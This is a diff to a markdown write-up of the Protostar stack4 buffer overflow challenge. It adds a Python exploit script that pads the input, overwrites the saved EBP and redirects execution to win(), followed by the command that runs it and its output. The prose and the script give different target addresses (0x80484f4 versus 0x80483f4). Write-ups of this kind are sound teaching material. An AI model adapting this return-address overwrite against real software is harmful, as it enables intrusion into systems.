@@ -148,11 +148,39 @@ $1 = {void (void)} 0x80483f4 <win>
 
 We see that the **memory address** of `win()` is `0x80483f4`. Now we have *everything* needed to **create our exploit script**.
 
-**TO-DO**
+To **create our exploit script**, we first need to pass `QQQWWWWEEEERRRRTTTTYYYY...` until `LLLL`, then pass `0x80484f4` in **little-edian** to properly **overwrite the return address** and **jump to** the `win()` function to complete the challenge!
+
+Here is the exploit script stored in `/tmp`:
+
+```python
+import struct
+
+padding = "QQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKK"
+ebp = "LLLL"
+win_func = struct.pack("I", 0x80483f4)
+
+print(padding + ebp + win_func)
+```
+
+Now enter this:
+
+```bash
+python /tmp/exploit.py | /opt/protostar/bin/stack4
+```'
+
+Result:
+
+```bash
+code flow successfully changed
+Segmentation fault (core dumped)
+```
+
+The **segfault** at the end is because we **overwritten the saved EBP** to an invalid address (`0x4c4c4c4c`).
 
 ## Resources
 
 * [C Code](https://exploit.education/protostar/stack-four/)
 * [Geeks for Geeks Article on Return Addresses](https://www.geeksforgeeks.org/dsa/how-is-return-address-specified-in-stack/)
+
 
 
